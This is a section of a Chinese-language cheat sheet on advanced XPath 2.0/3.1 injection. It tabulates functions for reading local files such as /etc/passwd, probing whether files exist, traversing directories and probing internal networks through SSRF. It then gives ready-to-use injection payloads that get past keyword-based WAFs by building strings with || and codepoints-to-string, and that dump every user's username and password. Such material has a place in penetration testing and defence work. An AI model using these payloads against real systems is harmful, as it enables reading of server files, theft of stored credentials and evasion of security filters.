## 六、XPath 2.0/3.1 高级利用

### 6.1 文件/网络读取函数矩阵
```
doc('file:///etc/passwd')          # XML文档（可解析节点）
doc-available('file:///...')       # 探测文件是否存在（布尔型）
unparsed-text('file:///etc/passwd')# 任意文本文件
unparsed-text-lines(...)           # 按行返回
collection('/path')                # 目录/集合遍历
# 注意：file://协议在部分实现中禁用，可用 http:// 内网探测（SSRF风味）
```

### 6.2 maps/arrays/高阶函数注入价值
```
# 用 || 与 codepoints-to-string 构造被WAF过滤的字符串
' or //user[username=('a'||'d'||'m'||'i'||'n')] or '
' or //user[username=codepoints-to-string(97,100,109,105,110)] or '

# 动态调用与for-each遍历输出（XQuery/3.x）
' or fn:string-join(//user ! (name() || '=' || string(.)), '\n') or '
' or for-each(//user, function($u){ $u/username || ':' || $u/password }) or '
```
**价值**：现代实现（BaseX/eXist/MarkLogic/Saxon）中3.x特性可显著简化批量提取，并绕过基于关键词（concat/string-join）的粗粒度WAF。

